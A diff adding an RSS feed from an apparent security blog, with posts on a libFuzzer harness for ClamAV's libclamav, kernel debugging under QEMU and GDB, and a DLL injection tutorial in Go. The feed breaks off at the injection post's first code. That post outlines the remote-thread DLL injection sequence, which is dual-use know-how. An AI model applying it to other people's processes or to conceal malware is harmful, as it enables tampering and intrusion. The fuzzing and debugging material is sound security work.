@@ -1,0 +1,783 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Posts on 0xcf9</title>
+        <link>https://example.org/posts/</link>
+        <description>Recent content in Posts on 0xcf9</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <lastBuildDate>Sat, 31 Dec 2022 17:46:40 +0200</lastBuildDate>
+        <atom:link href="https://example.org/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Books list 2022</title>
+            <link>https://example.org/posts/09-books-2022/</link>
+            <pubDate>Sat, 31 Dec 2022 17:46:40 +0200</pubDate>
+            
+            <guid>https://example.org/posts/09-books-2022/</guid>
+            <description>Another year, another list of books.
+Rust for Rustaceans Practical IoT Hacking Rock Guitar Tapping Technique Linux Kernel Debugging The Legendary Guitar of Jason Becker Marty Friedman: Exotic Metal Guitar Il Richiamo di Cthulhu (Gou Tanabe – Graphic Novel) Le Montagne della Follia (Gou Tanabe – Graphic Novel) </description>
+            <content type="html"><![CDATA[<p>Another year, another list of books.</p>
+<ul>
+<li>Rust for Rustaceans</li>
+<li>Practical IoT Hacking</li>
+<li>Rock Guitar Tapping Technique</li>
+<li>Linux Kernel Debugging</li>
+<li>The Legendary Guitar of Jason Becker</li>
+<li>Marty Friedman: Exotic Metal Guitar</li>
+<li>Il Richiamo di Cthulhu (Gou Tanabe – Graphic Novel)</li>
+<li>Le Montagne della Follia (Gou Tanabe – Graphic Novel)</li>
+</ul>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Build a simple fuzzer with libFuzzer</title>
+            <link>https://example.org/posts/02-libfuzzer/</link>
+            <pubDate>Thu, 17 Feb 2022 14:55:03 +0200</pubDate>
+            
+            <guid>https://example.org/posts/02-libfuzzer/</guid>
+            <description>libFuzzer is coverage-guided, evolutionary fuzzing engine. And it’s a wonderful tool to help with bug hunting.
+To quote the libFuzzer page:
+LibFuzzer is linked with the library under test, and feeds fuzzed inputs to the library via a specific fuzzing entrypoint (aka “target function”); the fuzzer then tracks which areas of the code are reached, and generates mutations on the corpus of input data in order to maximize the code coverage.</description>
+            <content type="html"><![CDATA[<p>libFuzzer is coverage-guided, evolutionary fuzzing engine. And it’s a wonderful tool to help with bug hunting.</p>
+<p>To quote the libFuzzer page:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>LibFuzzer is linked with the library under test, and feeds fuzzed inputs to the library via a specific fuzzing entrypoint (aka “target function”); the fuzzer then tracks which areas of the code are reached, and generates mutations on the corpus of input data in order to maximize the code coverage. The code coverage information for libFuzzer is provided by LLVM’s SanitizerCoverage instrumentation.
+</span></span></code></pre></div><p>So basically once it gets linked with your library it provides an easy way to feed mutated input to a target function at each iteration and the mutation is done in a way that tries to maximize the code coverage. All clear.</p>
+<p>What we want to accomplish here is to write a simple fuzzer for libclamav, the library at the core of ClamAV antivirus.</p>
+<p>So the first step is understanding how we’re going to link libFuzzer to libclamav when building ClamAV and its components.</p>
+<p>To quote libFuzzer documentation:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>If modifying CFLAGS of a large project, which also compiles executables requiring their own main symbol, it may be desirable to request just the instrumentation without linking:
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>clang -fsanitize<span style="color:#f92672">=</span>fuzzer-no-link mytarget.c
+</span></span></code></pre></div><p>And this is exactly our case.</p>
+<p>So these are the steps:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>1. tar zxvf clamav-0.104.2.tar.gz <span style="color:#f92672">&amp;&amp;</span> cd clamav-0.104.2
+</span></span><span style="display:flex;"><span>2. mkdir build <span style="color:#f92672">&amp;&amp;</span> build
+</span></span><span style="display:flex;"><span>3. CC<span style="color:#f92672">=</span>clang CXX<span style="color:#f92672">=</span>clang++ CFLAGS<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;-fsanitize=fuzzer-no-link,address&#34;</span> cmake ../
+</span></span><span style="display:flex;"><span>4. cmake --build .
+</span></span></code></pre></div><p>The important points here are the the choice of the compiler, which has to be of course clang and setting the CFLAGS in order to add to the code the fuzzing instrumentation and ASAN. The fuzzer-no-link specifies that we add the fuzzing instrumentation to the components being compiled, but we will provide the entry point in another application, which will be the fuzzer itself.</p>
+<p>In order to fuzz a function of our choice the entry point of the fuzzer application needs to be declared as the following one:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">LLVMFuzzerTestOneInput</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">uint8_t</span> <span style="color:#f92672">*</span>Data, <span style="color:#66d9ef">size_t</span> Size) {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DoSomethingInterestingWithMyAPI</span>(Data, Size);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;  <span style="color:#75715e">// Non-zero return values are reserved for future use.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span></code></pre></div><p>Data and Size are the current mutated input derived from the corpus (or in case of a missing corpus it will be generated by libFuzzer itself) and its size in bytes.</p>
+<p>So the question now is: how do we provide such data to libclamav? We choose a target function of the library, which in this case is:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">cl_scanfile</span>(
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>filename,
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>virname,
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>scanned,
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> cl_engine <span style="color:#f92672">*</span>engine,
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> cl_scan_options <span style="color:#f92672">*</span>options);
+</span></span></code></pre></div><p>This function receives a filename to be scanned, a pointer to virname where the virus name will be stored in case the supplied file has been identified as a malicious one, the scanned data size til now (actually optional parameter, it can be NULL), the engine which is the AV engine struct and options which is a struct containing a series of options that control the behavior of the engine.</p>
+<p>Lets first write a function which initializes the engine and returns a pointer to it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>byteCodePath <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/var/lib/clamav/bytecode.cvd&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> cl_engine <span style="color:#f92672">*</span><span style="color:#a6e22e">init_clam</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> signo;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">cl_error_t</span> status <span style="color:#f92672">=</span> <span style="color:#a6e22e">cl_init</span>(CL_INIT_DEFAULT);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (status <span style="color:#f92672">!=</span> CL_SUCCESS) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;cl_init error: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">cl_strerror</span>(status));
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> cl_engine <span style="color:#f92672">*</span>engine <span style="color:#f92672">=</span> <span style="color:#a6e22e">cl_engine_new</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (engine <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;cl_engine_new error</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    status <span style="color:#f92672">=</span> <span style="color:#a6e22e">cl_load</span>(byteCodePath, engine, <span style="color:#f92672">&amp;</span>signo, CL_DB_BYTECODE);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (status <span style="color:#f92672">!=</span> CL_SUCCESS) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;cl_load error: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">cl_strerror</span>(status));
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> cleanup_engine_with_error;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    status <span style="color:#f92672">=</span> <span style="color:#a6e22e">cl_engine_compile</span>(engine);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (status <span style="color:#f92672">!=</span> CL_SUCCESS) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;cl_engine_compile: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">cl_strerror</span>(status));
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> cleanup_engine_with_error;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> engine;
+</span></span><span style="display:flex;"><span>cleanup_engine_with_error:
+</span></span><span style="display:flex;"><span>    status <span style="color:#f92672">=</span> <span style="color:#a6e22e">cl_engine_free</span>(engine);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (status <span style="color:#f92672">!=</span> CL_SUCCESS) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;cl_engine_free: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">cl_strerror</span>(status));
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>We call cl_init() to initialize the library, the we cl_engine_new() in order to get a new engine then cl_load() to load bytecode based signatures. Notice here that I’ve used specifically this kind of signature since it is small and quick to be loaded. We do so in order to speed up the fuzzer initialization process, if you use huge signatures database it will take time for the fuzzer to load and execute each time (for example if you’re going to fuzz clamscan binary with AFL++ or hongfuzz you will likely experience timeouts). We then finalize the process calling cl_engine_compile(). In case of errors we just return NULL and free the engine.</p>
+<p>Our target function cl_scanfile() accepts a filename, while libFuzzer provides us with pointer to a series of bytes. So in order to provide this input to cl_scanfile() we need to first drop the content into a file and then invoke it passing the filename. So we write an utility function, which accepts a pointer to the data and its size and writes the content into a file which name suffix is “randomized”.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">create_fuzz_file</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">uint8_t</span> <span style="color:#f92672">*</span>data, <span style="color:#66d9ef">size_t</span> size) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> path[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/tmp/fuzz-XXXXXX&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">mkstemp</span>(path);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (fd <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> status <span style="color:#f92672">=</span> <span style="color:#a6e22e">write</span>(fd, data, size);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (status <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">close</span>(fd);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">unlink</span>(path);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close</span>(fd);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>f <span style="color:#f92672">=</span> <span style="color:#a6e22e">strndup</span>(path, <span style="color:#a6e22e">strlen</span>(path));
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (f <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">unlink</span>(path);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> f;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The function is very simple, it creates a temporary file name with the /tmp/fuzz-XXXXXX template passed to mkstemp, writes the data in and returns a copy of its name allocated on the heap, so we’ve to remember to free it at some point.</p>
+<p>Now last piece of the, the fuzzer entry point function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">LLVMFuzzerTestOneInput</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">uint8_t</span> <span style="color:#f92672">*</span>data, <span style="color:#66d9ef">size_t</span> size) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> cl_engine <span style="color:#f92672">*</span>engine <span style="color:#f92672">=</span> <span style="color:#a6e22e">init_clam</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (engine <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;error while initializing clam</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>     
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>fname <span style="color:#f92672">=</span> <span style="color:#a6e22e">create_fuzz_file</span>(data, size);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (fname <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;failed to create fuzz file</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> cleanup_engine;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>virname;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> cl_scan_options options;
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    options.parse <span style="color:#f92672">=</span> CL_SCAN_PARSE_ELF <span style="color:#f92672">|</span> CL_SCAN_PARSE_ARCHIVE <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span>        CL_SCAN_PARSE_HTML <span style="color:#f92672">|</span> CL_SCAN_PARSE_HWP3 <span style="color:#f92672">|</span> CL_SCAN_PARSE_MAIL <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span>        CL_SCAN_PARSE_OLE2 <span style="color:#f92672">|</span> CL_SCAN_PARSE_PDF <span style="color:#f92672">|</span> CL_SCAN_PARSE_PE <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span>        CL_SCAN_PARSE_SWF <span style="color:#f92672">|</span> CL_SCAN_PARSE_XMLDOCS <span style="color:#f92672">|</span> CL_SCAN_MAIL_PARTIAL_MESSAGE;
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    options.general <span style="color:#f92672">=</span> CL_SCAN_GENERAL_ALLMATCHES <span style="color:#f92672">|</span> CL_SCAN_GENERAL_HEURISTICS;
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    options.heuristic <span style="color:#f92672">=</span> CL_SCAN_HEURISTIC_BROKEN <span style="color:#f92672">|</span> CL_SCAN_HEURISTIC_MACROS <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span>        CL_SCAN_HEURISTIC_STRUCTURED;
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">cl_error_t</span> status <span style="color:#f92672">=</span> <span style="color:#a6e22e">cl_scanfile</span>(fname, <span style="color:#f92672">&amp;</span>virname, NULL, engine, <span style="color:#f92672">&amp;</span>options);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (status <span style="color:#f92672">==</span> CL_VIRUS) {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//fprintf(stdout, &#34;detected virus: %s\n&#34;, virname);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (status <span style="color:#f92672">!=</span> CL_CLEAN) {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//fprintf(stderr, &#34;cl_scanfile error: %s\n&#34;, cl_strerror(status));
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">goto</span> cleanup_file;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>cleanup_file:
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">unlink</span>(fname);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">free</span>(fname);
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>cleanup_engine:
+</span></span><span style="display:flex;"><span>    status <span style="color:#f92672">=</span> <span style="color:#a6e22e">cl_engine_free</span>(engine);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (status <span style="color:#f92672">!=</span> CL_SUCCESS) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;cl_engine_free: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">cl_strerror</span>(status));
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Here the steps performed by this function:</p>
+<ul>
+<li>Call our init_clam() function and get a pointer to a new engine instance</li>
+<li>Call create_fuzz_file() and get a pointer to the filename</li>
+<li>Create a struct cl_options and initialize it with various file formats the engine has to scan, then we specify CL_SCAN_GENERAL_ALLMATCHES, which tells the scan function to continue to scan the file after it finds a first match and CL_SCAN_GENERAL_HEURISTICS which enables heuristics alerts to be shown (you can disable it if you want). Then we enable some heuristics and that’s it</li>
+<li>We finally invoke the cl_scanfile() and at the end of the function we just cleanup freeing the engine and removing the fuzzed file</li>
+<li>Before we build the fuzzer we need another step, to just make our life a little bit easier. We copy the instrumented shared libraries that have been built before in our current fuzzer directory:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find clamav-0.104.2/build -name <span style="color:#e6db74">&#34;*.so.*&#34;</span> -exec cp <span style="color:#f92672">{}</span> . <span style="color:#ae81ff">\;</span>
+</span></span></code></pre></div><p>Now we just build our fuzzer:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>clang -o fuzz_libclamav fuzz_libclamav.c libclamav.so.9.1.0 libclammspack.so.0.8.0 -fsanitize<span style="color:#f92672">=</span>fuzzer,address -I ./clamav-0.104.2/libclamav/ -I ./clamav-0.104.2/build/
+</span></span></code></pre></div><p>Now we need to have some corpus in order to aid the fuzzer with its job, for example we can create a CORPUS directory and put inside an ELF binary like echo or whatever we like. Or can try with archives, PDF and any other file type supported by ClamAV.</p>
+<p>OK! Finally we can run our fuzzer (we need to use LD_LIBRARY_PATH to instruct the dynamic linker at runtime that necessary libraries have to be searched into our current fuzzer directory):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>LD_LIBRARY_PATH<span style="color:#f92672">=(</span>pwd<span style="color:#f92672">)</span> ./fuzz_libclamav CORPUS/
+</span></span><span style="display:flex;"><span>Fuzzing session starting up
+</span></span></code></pre></div><p><img src="/libfuzzer.webp" alt="libfuzzer"></p>
+<p>If we hit CTRL-C and interrupt the execution we can always restart it later just rerunning the command above.</p>
+<p>Don’t forget to check the libFuzzer documentation in order to dig deep into its details since we just scratched the surface.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Quick Linux Kernel debug with QEMU, GDB and U-ROOT</title>
+            <link>https://example.org/posts/03-linux-kernel-debug/</link>
+            <pubDate>Mon, 14 Feb 2022 17:07:01 +0200</pubDate>
+            
+            <guid>https://example.org/posts/03-linux-kernel-debug/</guid>
+            <description>When I want to harness with the Kernel, e.g., to play with some module I wrote, or just maybe learning something new about its internals I usually relay on some quick tricks to bring up a small environment to play with.
+The first thing is I do is reusing the host kernel of my favorite distro: Fedora (unless some upstream feature I want to play with is not there and in that case I grab directly the sources from kernel.</description>
+            <content type="html"><![CDATA[<p>When I want to harness with the Kernel, e.g., to play with some module I wrote, or just maybe learning something new about its internals I usually relay on some quick tricks to bring up a small environment to play with.</p>
+<p>The first thing is I do is reusing the host kernel of my favorite distro: Fedora (unless some upstream feature I want to play with is not there and in that case I grab directly the sources from kernel.org building a custom one).</p>
+<p>Second in order to have a minimal userspace I use U-ROOT to quickly build an initramfs.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>GO111MODULE<span style="color:#f92672">=</span>off ~/go/bin/u-root -build<span style="color:#f92672">=</span>gbb -o initramfs
+</span></span></code></pre></div><p>Third in order to get support for debugging symbols I get the kernel-debuginfo package matching the host kernel, so I have both vmlinux and modules completely unstripped.</p>
+<p>In order to run in QEMU:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>qemu-system-x86_64 -kernel /boot/vmlinuz-5.16.8-200.fc35.x86_64 -enable-kvm -smp <span style="color:#ae81ff">2</span> -m 2048M -s -S -initrd initramfs -append <span style="color:#e6db74">&#34;nokaslr&#34;</span>
+</span></span></code></pre></div><p>The above command will run QEMU with the specified kernel and provides it an initramfs. The <code>-s -S</code> switch will tell QEMU to freeze on startup and start waiting for a GDB connection on port 1234. Also do not forget to append <code>nokaslr</code> to the kernel cmdline otherwise GDB later will not be able to solve symbols addresses.</p>
+<p>Then we can open another shell and connect to QEMU using GDB in order to start a debugging session:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gdb -q /usr/lib/debug/lib/modules/5.16.8-200.fc35.x86_64/vmlinux
+</span></span><span style="display:flex;"><span>pwndbg&gt; set architecture i386:x86-64
+</span></span><span style="display:flex;"><span>The target architecture is set to <span style="color:#e6db74">&#34;i386:x86-64&#34;</span>.
+</span></span><span style="display:flex;"><span>pwndbg&gt; target remote :1234
+</span></span><span style="display:flex;"><span>Remote debugging using :1234
+</span></span><span style="display:flex;"><span>pwndbg&gt; hbreak start_kernel
+</span></span><span style="display:flex;"><span>Hardware assisted breakpoint <span style="color:#ae81ff">1</span> at 0xffffffff836c1e57: file init/main.c, line 925.
+</span></span><span style="display:flex;"><span>pwndbg&gt; c
+</span></span><span style="display:flex;"><span>Continuing.
+</span></span></code></pre></div><p><img src="/kernel_debugging.webp" alt="gdb"></p>
+<p>In the preceeding commands we first open GDB and provide the unstripped vmlinux image that comes with kernel-debuginfo package, then we set the target architecture for the running kernel, and finally put an hardware breakpoint on start_kernel function. Then we issue continue command and as soon as the breakpoint will be accessed execution will break. That’s it.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>DLL Injection using Go</title>
+            <link>https://example.org/posts/04-go-dll-inject/</link>
+            <pubDate>Wed, 19 Jan 2022 17:11:33 +0200</pubDate>
+            
+            <guid>https://example.org/posts/04-go-dll-inject/</guid>
+            <description>DLL injection is the act of loading a library into a running process. Purposes can be multiple ones, like hijacking or instrumenting code, extending or adding functionalities of a software without recompiling it or malicious intents like hiding malware components.
+In the first part of the post we will deal with the injection itself, while in the second one we’ll build a DLL in Go emphasizing some of the limitations and try to overcome them.</description>
+            <content type="html"><![CDATA[<p>DLL injection is the act of loading a library into a running process. Purposes can be multiple ones, like hijacking or instrumenting code, extending or adding functionalities of a software without recompiling it or malicious intents like hiding malware components.</p>
+<p>In the first part of the post we will deal with the injection itself, while in the second one we’ll build a DLL in Go emphasizing some of the limitations and try to overcome them. The whole article targets x86-64 machines and in order to build the DLL the mingw toolchain is needed. My personal choice is to install it using cygwin, but other ways do exist, so if you don’t like it, just search for something you prefer.</p>
+<h2 id="dll-injection">DLL Injection:</h2>
+<p>In order to load a DLL into a running process what is needed are usually the following steps:</p>
+<ul>
+<li>Call OpenProcess to obtain a handle to the process</li>
+<li>Call VirtualAllocEx to allocate virtual memory into the remote process</li>
+<li>Call WriteProcessMemory with the address obtained by VirtualAllocEx in order to write the path of the DLL file into remote process memory</li>
+<li>Resolve the LoadLibraryA function address locally to the injector process. Since this function belongs to kernel32.dll which is mapped in all processes at the same address, we don’t need to resolve where it resides into our victim/remote process</li>
+<li>Call CreateRemoteThread in order to start a thread into the remote process, the entry point will be the LoadLibraryA address and its argument will be the address where we stored the DLL path</li>
+</ul>
+<p>From now on let’s see how to write code to accomplish the above steps, also notice that where possible and to make the article more readable I’m going to omit error handling.</p>
+<p>Go provides a package to deal with some Windows Win32 APIs but not all the functions we need are implemented, but this is not a problem, because we can resolve their addresses calling GetProcAddress on the kernel32.dll module.</p>
+<p>So, the first step is to obtain a handle to the process, its type is windows.Handle that is just a typecast of uintptr in Go</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#75715e">// process open permissions
